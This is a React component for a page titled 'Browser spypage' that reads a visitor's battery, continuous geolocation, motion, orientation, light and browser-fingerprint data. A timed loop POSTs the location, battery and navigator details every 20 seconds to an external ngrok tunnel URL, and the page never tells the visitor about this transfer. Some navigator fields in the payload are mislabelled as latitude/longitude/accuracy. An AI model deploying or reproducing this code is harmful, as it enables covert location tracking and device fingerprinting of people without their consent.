import React, { Component } from 'react'
import _ from 'lodash'
import logo from './../../logo.svg'
import './Main.css'
import objectify from 'geoposition-to-object'

class Main extends Component {
  constructor(props) {
    super(props)
    this.state = {}
    this.queryPeriod = 20000

    if (navigator.getBattery) {
      navigator.getBattery().then((battery) => {
        this.setState(() => ({ battery }))
        battery.addEventListener('chargingchange', () => {
          this.setState(() => ({ battery }))
        })
      })
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((geo) => {
        this.setState(() => ({ geo }))
      })
      navigator.geolocation.watchPosition((geo) => {
        this.setState(() => ({ geo }))
      })
    }

    window.addEventListener('deviceorientation', _.throttle((deviceorientation) => {
      this.setState(() => ({ deviceorientation }))
    }, this.queryPeriod), false)

    window.addEventListener('devicemotion', _.throttle((devicemotion) => {
      this.setState(() => ({ devicemotion }))
    }, this.queryPeriod), false)

    window.addEventListener('devicelight', _.throttle((devicelight) => {
      this.setState(() => ({ devicelight }))
    }, this.queryPeriod), false)

    window.addEventListener('deviceproximity', _.throttle((deviceproximity) => {
      this.setState(() => ({ deviceproximity }))
    }, this.queryPeriod), false)

    if ('AmbientLightSensor' in window) {
      var sensor = new window.AmbientLightSensor();
      sensor.onreading = function () {
        this.setState(() => ({ lightlevel: sensor }))
      };
      sensor.onerror = function (event) {
        console.log("No light sensor", event.error.name, event.error.message);
      };
      sensor.start();
    }

    const self = this;
    setInterval(() => {
      console.log(self.state)
      let body = {};

      if (self.isBatterySensorInitialized()) {
        body.battery = {
          charging: self.state.battery.charging,
          chargingTime: self.state.battery.chargingTime,
          dischargingTime: self.state.battery.dischargingTime,
          level: self.state.battery.level,
        }
      }

      if (self.isGeoSensorInitialized()) {
        const coords = self.state.geo.coords;
        body.geo = {
          accuracy: coords.accuracy,
          latitude: coords.latitude,
          longitude: coords.longitude,
          speed: coords.speed,
        }
      }

      body.navigator = {
        accuracy: window.navigator.appVersion,
        latitude: window.navigator.appName,
        longitude: window.navigator.appCodeName,
        languages: window.navigator.languages.join(', '),
        platform: window.navigator.platform,
        product: window.navigator.product,
        userAgent: window.navigator.userAgent,
        vendor: window.navigator.vendor,
        effectiveType: window.navigator.connection ? window.navigator.connection.effectiveType : 'Not available',
      }

      const xhr = new XMLHttpRequest();
      const url = "https://c58aaf34.ngrok.io";
      xhr.open("POST", url, true);
      xhr.setRequestHeader("Content-type", "application/json");
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
          var json = JSON.parse(xhr.responseText);
          console.log(json);
        }
      };
      const data = JSON.stringify(body);
      xhr.send(data);
    }, this.queryPeriod)
  }

  isBatterySensorInitialized() {
    return this.state && this.state.battery
  }

  isGeoSensorInitialized() {
    return this.state && this.state.geo
  }

  isDeviceorientationSensorInitialized() {
    return this.state && this.deviceorientation()
  }

  isDevicemotionSensorInitialized() {
    return this.state && this.devicemotion()
  }

  isDevicelightSensorInitialized() {
    return this.state && this.devicelight()
  }

  isDeviceproximitySensorInitialized() {
    return this.state && this.deviceproximity()
  }

  isLightlevelSensorInitialized() {
    return this.state && this.lightlevel()
  }

  deviceorientation() {
    return this.state.deviceorientation
  }

  devicemotion() {
    return this.state.devicemotion
  }

  battery() {
    return this.state.battery
  }

  geo() {
    return this.state.geo
  }

  devicelight() {
    return this.state.devicelight
  }

  lightlevel() {
    return this.state.lightlevel
  }

  deviceproximity() {
    return this.state.deviceproximity
  }

  objectToMap(object) {
    return this.objectToMap2(object)
  }

  objectToMap2(object) {
    let map = {}
    for (let key in object) {
      let val = object[key]
      if (!_.isFunction(val)) {
        if (!_.isObject(val)) {
          map[key] = val
        } else {
          if (val === window) {
            return
          }
          map[key] = this.objectToMap2(val)
        }
      }
    }
    return map
  }


  render() {
    return (
      <div className="App">
        <header className="App-header">
          <img src={logo} className="App-logo" alt="logo" />
          <h1 className="App-title">Browser spypage</h1>
        </header>
        <div className="App-intro">

          <div className="block-of-api">
            <h2>Navigator</h2>
            <p>appVersion: {navigator.appVersion}</p>
            <p>appName : {navigator.appName}</p>
            <p>appCodeName : {navigator.appCodeName}</p>
            <p>languages : {navigator.languages.join(', ')}</p>
            <p>platform : {navigator.platform}</p>
            <p>product : {navigator.product}</p>
            <p>userAgent : {navigator.userAgent}</p>
            <p>vendor : {navigator.vendor}</p>
            <p>connection.effectiveType : {navigator.connection ? navigator.connection.effectiveType : 'Not available'}</p>
          </div>

          <div className="block-of-api">
            <h2>Battery sensor (Chrome)</h2>
            <p>Is
              Charging? {this.isBatterySensorInitialized() ? (this.battery().charging ? 'Yes' : 'No') : 'Not initialized yet'}</p>
            <p>chargingTime {this.isBatterySensorInitialized() ? this.battery().chargingTime : 'Not initialized yet'}</p>
            <p>dischargingTime {this.isBatterySensorInitialized() ? this.battery().dischargingTime : 'Not initialized yet'}</p>
            <p>level {this.isBatterySensorInitialized() ? this.battery().level : 'Not initialized yet'}</p>
          </div>

          <div className="block-of-api">
            <h2>Geo sensor (Chrome && FF)</h2>
            <p>Accuracy {this.isGeoSensorInitialized() ? (this.geo().coords.accuracy) : 'Not initialized yet'}</p>
            <p>latitude {this.isGeoSensorInitialized() ? this.geo().coords.latitude : 'Not initialized yet'}</p>
            <p>longitude {this.isGeoSensorInitialized() ? this.geo().coords.longitude : 'Not initialized yet'}</p>
            <p>speed {this.isGeoSensorInitialized() ? this.geo().coords.speed : 'Not initialized yet'}</p>
          </div>

          <div className="block-of-api">
            <h2>Devicemotion sensor (Chrome && FF)</h2>
            <p>x {this.isDevicemotionSensorInitialized() ? (this.devicemotion().acceleration.x) : 'Not initialized yet'}</p>
            <p>y {this.isDevicemotionSensorInitialized() ? this.devicemotion().acceleration.y : 'Not initialized yet'}</p>
            <p>z {this.isDevicemotionSensorInitialized() ? this.devicemotion().acceleration.z : 'Not initialized yet'}</p>
          </div>

          <div className="block-of-api">
            <h2>Deviceorientation sensor (Chrome && FF)</h2>
            <p>absolute {this.isDeviceorientationSensorInitialized() ? this.deviceorientation().absolute : 'Not initialized yet'}</p>
            <p>alpha {this.isDeviceorientationSensorInitialized() ? this.deviceorientation().alpha : 'Not initialized yet'}</p>
            <p>beta {this.isDeviceorientationSensorInitialized() ? this.deviceorientation().beta : 'Not initialized yet'}</p>
            <p>gamma {this.isDeviceorientationSensorInitialized() ? this.deviceorientation().gamma : 'Not initialized yet'}</p>
          </div>

          <div className="block-of-api">
            <h2>Devicelight sensor (FF)</h2>
            <p>value {this.isDevicelightSensorInitialized() ? this.devicelight().value : 'Not initialized yet'}</p>
          </div>

          <div className="block-of-api">
            <h2>Deviceproximity sensor (FF)</h2>
            <p>value {this.isDeviceproximitySensorInitialized() ? this.deviceproximity().value : 'Not initialized yet'}</p>
            <p>min {this.isDeviceproximitySensorInitialized() ? this.deviceproximity().min : 'Not initialized yet'}</p>
            <p>max {this.isDeviceproximitySensorInitialized() ? this.deviceproximity().max : 'Not initialized yet'}</p>
          </div>

          <div className="block-of-api">
            <h2>Lightlevel sensor (Chrome) </h2>
            <p>value {this.isLightlevelSensorInitialized() ? this.lightlevel().illuminance : 'Not initialized yet'}</p>
          </div>


        </div>
      </div>
    )
  }
}

export default Main
